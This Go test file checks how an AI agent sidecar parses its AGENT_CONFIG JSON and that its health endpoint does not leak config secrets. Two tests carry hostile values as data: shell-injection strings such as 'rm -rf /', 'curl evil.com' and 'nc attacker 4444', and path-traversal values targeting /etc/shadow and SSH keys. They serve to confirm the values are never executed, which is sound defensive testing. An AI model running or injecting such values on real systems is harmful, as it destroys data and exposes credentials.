package main

import (
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"testing"
)

// --- parseAgentConfig adversarial tests ---

func TestParseAgentConfig_InvalidJSON_ReturnsError(t *testing.T) {
	t.Setenv("AGENT_CONFIG", `{"model": broken}`)

	_, err := parseAgentConfig()
	if err == nil {
		t.Fatal("expected error for invalid JSON, got nil")
	}
}

func TestParseAgentConfig_EmptyObject_ReturnsDefaults(t *testing.T) {
	t.Setenv("AGENT_CONFIG", `{}`)

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.Model != "" {
		t.Fatalf("Model = %q, want empty", cfg.Model)
	}
	if cfg.ResumeSession != "" {
		t.Fatalf("ResumeSession = %q, want empty", cfg.ResumeSession)
	}
	if cfg.MaxTurns != 0 {
		t.Fatalf("MaxTurns = %d, want 0", cfg.MaxTurns)
	}
	if len(cfg.AllowedTools) != 0 {
		t.Fatalf("AllowedTools = %v, want empty", cfg.AllowedTools)
	}
	if len(cfg.Env) != 0 {
		t.Fatalf("Env = %v, want empty", cfg.Env)
	}
	if cfg.ApprovalMode != "" {
		t.Fatalf("ApprovalMode = %q, want empty", cfg.ApprovalMode)
	}
}

func TestParseAgentConfig_UnsetEnv_ReturnsDefaults(t *testing.T) {
	t.Setenv("AGENT_CONFIG", "")

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.Model != "" || cfg.ResumeSession != "" || cfg.ApprovalMode != "" ||
		cfg.MaxTurns != 0 || len(cfg.AllowedTools) != 0 || len(cfg.Env) != 0 {
		t.Fatalf("expected zero-value AgentConfig, got %+v", cfg)
	}
}

func TestParseAgentConfig_UnknownFields_Ignored(t *testing.T) {
	t.Setenv("AGENT_CONFIG", `{
		"model": "claude-opus-4-5",
		"future_field": true,
		"nested": {"deep": 42},
		"list_field": [1,2,3]
	}`)

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.Model != "claude-opus-4-5" {
		t.Fatalf("Model = %q, want claude-opus-4-5", cfg.Model)
	}
}

func TestParseAgentConfig_ExtremelyLongModel_DoesNotCrash(t *testing.T) {
	longModel := strings.Repeat("a", 10*1024) // 10KB
	raw, _ := json.Marshal(AgentConfig{Model: longModel})
	t.Setenv("AGENT_CONFIG", string(raw))

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(cfg.Model) != 10*1024 {
		t.Fatalf("Model length = %d, want %d", len(cfg.Model), 10*1024)
	}
}

func TestParseAgentConfig_ShellInjectionInModel_NotExecuted(t *testing.T) {
	// The model field must be treated as an opaque string, never shell-evaluated.
	injections := []string{
		"'; rm -rf /'",
		"$(whoami)",
		"`cat /etc/passwd`",
		"claude-opus-4-5; echo pwned",
		"claude-opus-4-5 && curl evil.com",
		"claude-opus-4-5 | nc attacker 4444",
	}

	for _, injection := range injections {
		raw, _ := json.Marshal(AgentConfig{Model: injection})
		t.Setenv("AGENT_CONFIG", string(raw))

		cfg, err := parseAgentConfig()
		if err != nil {
			t.Fatalf("unexpected error for %q: %v", injection, err)
		}
		// The value must survive round-trip unchanged — no shell interpretation.
		if cfg.Model != injection {
			t.Fatalf("Model = %q, want %q", cfg.Model, injection)
		}
	}
}

func TestParseAgentConfig_EnvWithSpecialChars_PassThrough(t *testing.T) {
	env := map[string]string{
		"SIMPLE":          "value",
		"HAS_EQUALS":      "key=value=extra",
		"HAS_SPACES":      "hello world",
		"HAS_NEWLINE":     "line1\nline2",
		"HAS_QUOTES":      `say "hello"`,
		"HAS_BACKSLASH":   `path\to\thing`,
		"HAS_DOLLAR":      "$HOME/bin",
		"HAS_BACKTICK":    "`whoami`",
		"HAS_SEMICOLON":   "a;b;c",
		"HAS_PIPE":        "a|b",
		"EMPTY":           "",
		"UNICODE":         "\u00e9\u00e0\u00fc\U0001f600",
		"NULL_BYTES_SAFE": "before\x00after", // JSON can't represent null bytes, but test the round-trip
	}

	raw, _ := json.Marshal(AgentConfig{Env: env})
	t.Setenv("AGENT_CONFIG", string(raw))

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	for k, want := range env {
		// JSON encoding can't represent null bytes — they get escaped.
		// Skip the null-byte key for exact comparison.
		if k == "NULL_BYTES_SAFE" {
			continue
		}
		got, ok := cfg.Env[k]
		if !ok {
			t.Errorf("Env missing key %q", k)
			continue
		}
		if got != want {
			t.Errorf("Env[%q] = %q, want %q", k, got, want)
		}
	}
}

func TestParseAgentConfig_PathTraversalInResumeSession(t *testing.T) {
	// parseAgentConfig itself doesn't sanitize — it's a pure deserializer.
	// But the value must survive parsing unchanged so the caller can sanitize.
	traversals := []string{
		"../../etc/passwd",
		"../../../tmp/evil",
		"/etc/shadow",
		"sess-id/../../../root/.ssh/id_rsa",
		"..\\..\\windows\\system32",
	}

	for _, path := range traversals {
		raw, _ := json.Marshal(AgentConfig{ResumeSession: path})
		t.Setenv("AGENT_CONFIG", string(raw))

		cfg, err := parseAgentConfig()
		if err != nil {
			t.Fatalf("unexpected error for %q: %v", path, err)
		}
		if cfg.ResumeSession != path {
			t.Fatalf("ResumeSession = %q, want %q", cfg.ResumeSession, path)
		}
	}
}

func TestParseAgentConfig_NullAndMissingFields_UseDefaults(t *testing.T) {
	// JSON null for optional fields should result in zero values.
	t.Setenv("AGENT_CONFIG", `{
		"model": null,
		"resume_session": null,
		"env": null,
		"approval_mode": null,
		"max_turns": null,
		"allowed_tools": null
	}`)

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.Model != "" {
		t.Fatalf("Model = %q, want empty", cfg.Model)
	}
	if cfg.ResumeSession != "" {
		t.Fatalf("ResumeSession = %q, want empty", cfg.ResumeSession)
	}
	if cfg.MaxTurns != 0 {
		t.Fatalf("MaxTurns = %d, want 0", cfg.MaxTurns)
	}
	if cfg.AllowedTools != nil {
		t.Fatalf("AllowedTools = %v, want nil", cfg.AllowedTools)
	}
	if cfg.Env != nil {
		t.Fatalf("Env = %v, want nil", cfg.Env)
	}
}

// --- newBackend integration: AGENT_CONFIG fields thread into backends ---

func TestNewBackend_InvalidConfig_FallsBackToDefaults(t *testing.T) {
	// If AGENT_CONFIG is invalid, newSidecarFromEnv returns an error.
	// But newBackend itself with a zero-value config should produce a
	// working backend with all defaults.
	backend, err := newBackend("claude", []string{"claude"}, AgentConfig{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	cb, ok := backend.(*ClaudeBackend)
	if !ok {
		t.Fatalf("expected *ClaudeBackend, got %T", backend)
	}
	if cb.model != "" {
		t.Fatalf("model = %q, want empty", cb.model)
	}
	if cb.maxTurns != 0 {
		t.Fatalf("maxTurns = %d, want 0", cb.maxTurns)
	}
}

func TestNewBackend_ConfigFieldsThreaded(t *testing.T) {
	cfg := AgentConfig{
		Model:        "claude-opus-4-5",
		MaxTurns:     10,
		AllowedTools: []string{"Read", "Write"},
		Env:          map[string]string{"FOO": "bar"},
	}

	backend, err := newBackend("claude", []string{"claude"}, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	cb := backend.(*ClaudeBackend)
	if cb.model != "claude-opus-4-5" {
		t.Fatalf("model = %q, want claude-opus-4-5", cb.model)
	}
	if cb.maxTurns != 10 {
		t.Fatalf("maxTurns = %d, want 10", cb.maxTurns)
	}
	if !sharedEqualStrings(cb.allowedTools, []string{"Read", "Write"}) {
		t.Fatalf("allowedTools = %v, want [Read Write]", cb.allowedTools)
	}
	if cb.extraEnv["FOO"] != "bar" {
		t.Fatalf("extraEnv[FOO] = %q, want bar", cb.extraEnv["FOO"])
	}
}

// --- AGENT_CONFIG + AGENT_PROMPT coexistence ---

func TestNewBackend_ConfigPlusPrompt(t *testing.T) {
	t.Setenv("AGENT_PROMPT", "Fix the bug in auth.go")

	cfg := AgentConfig{
		Model:    "claude-opus-4-5",
		MaxTurns: 5,
	}

	backend, err := newBackend("claude", []string{"claude"}, cfg)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	cb := backend.(*ClaudeBackend)
	if cb.prompt != "Fix the bug in auth.go" {
		t.Fatalf("prompt = %q, want 'Fix the bug in auth.go'", cb.prompt)
	}
	if cb.model != "claude-opus-4-5" {
		t.Fatalf("model = %q, want claude-opus-4-5", cb.model)
	}
	if cb.maxTurns != 5 {
		t.Fatalf("maxTurns = %d, want 5", cb.maxTurns)
	}
}

// --- Health endpoint must not expose AGENT_CONFIG ---

func TestHealthEndpoint_DoesNotExposeAgentConfig(t *testing.T) {
	t.Setenv("AGENT_CONFIG", `{
		"model": "secret-model-name",
		"env": {"SECRET_KEY": "super-secret-value"},
		"resume_session": "private-session-id"
	}`)

	backend := newMockBackend("sess-config-leak")
	_, ts := newTestExternalWSServer(t, "claude", backend)

	resp, err := http.Get(ts.URL + "/health")
	if err != nil {
		t.Fatalf("GET /health: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read body: %v", err)
	}

	bodyStr := string(body)
	if strings.Contains(bodyStr, "secret-model-name") {
		t.Fatal("health endpoint exposes model from AGENT_CONFIG")
	}
	if strings.Contains(bodyStr, "super-secret-value") {
		t.Fatal("health endpoint exposes env values from AGENT_CONFIG")
	}
	if strings.Contains(bodyStr, "SECRET_KEY") {
		t.Fatal("health endpoint exposes env keys from AGENT_CONFIG")
	}
	if strings.Contains(bodyStr, "private-session-id") {
		// session_id in health is the backend's session ID, not resume_session
		// from config. The mock backend has "sess-config-leak".
		t.Fatal("health endpoint exposes resume_session from AGENT_CONFIG")
	}

	// Verify the health response only contains expected fields.
	var payload healthResponse
	if err := json.Unmarshal(body, &payload); err != nil {
		t.Fatalf("decode health: %v", err)
	}
	if payload.SessionID != "sess-config-leak" {
		t.Fatalf("SessionID = %q, want sess-config-leak", payload.SessionID)
	}
}

// --- Edge cases for parseAgentConfig ---

func TestParseAgentConfig_WrongTypes_ReturnsError(t *testing.T) {
	cases := []struct {
		name string
		json string
	}{
		{"model_as_number", `{"model": 42}`},
		{"max_turns_as_string", `{"max_turns": "ten"}`},
		{"env_as_array", `{"env": ["a","b"]}`},
		{"allowed_tools_as_string", `{"allowed_tools": "Read"}`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("AGENT_CONFIG", tc.json)
			_, err := parseAgentConfig()
			if err == nil {
				t.Fatal("expected error for wrong type, got nil")
			}
		})
	}
}

func TestParseAgentConfig_MaxTurnsNegative(t *testing.T) {
	t.Setenv("AGENT_CONFIG", `{"max_turns": -5}`)

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Negative max_turns should parse without error (validation is the caller's job).
	if cfg.MaxTurns != -5 {
		t.Fatalf("MaxTurns = %d, want -5", cfg.MaxTurns)
	}
}

func TestParseAgentConfig_DeeplyNestedUnknownFields(t *testing.T) {
	// Forward compatibility: deeply nested unknown fields must not cause errors.
	t.Setenv("AGENT_CONFIG", `{
		"model": "test",
		"unknown_nested": {
			"level1": {
				"level2": {
					"level3": [1, 2, {"deep": true}]
				}
			}
		}
	}`)

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.Model != "test" {
		t.Fatalf("Model = %q, want test", cfg.Model)
	}
}

func TestParseAgentConfig_EmptyString_ReturnsDefaults(t *testing.T) {
	// Explicit empty string (not unset) should return defaults.
	t.Setenv("AGENT_CONFIG", "")

	cfg, err := parseAgentConfig()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.Model != "" || cfg.ResumeSession != "" || cfg.ApprovalMode != "" ||
		cfg.MaxTurns != 0 || len(cfg.AllowedTools) != 0 || len(cfg.Env) != 0 {
		t.Fatalf("expected zero-value AgentConfig, got %+v", cfg)
	}
}

func TestParseAgentConfig_WhitespaceOnly_ReturnsError(t *testing.T) {
	// Whitespace-only is not valid JSON and not empty — should error.
	t.Setenv("AGENT_CONFIG", "   \t\n  ")

	_, err := parseAgentConfig()
	if err == nil {
		t.Fatal("expected error for whitespace-only JSON, got nil")
	}
}
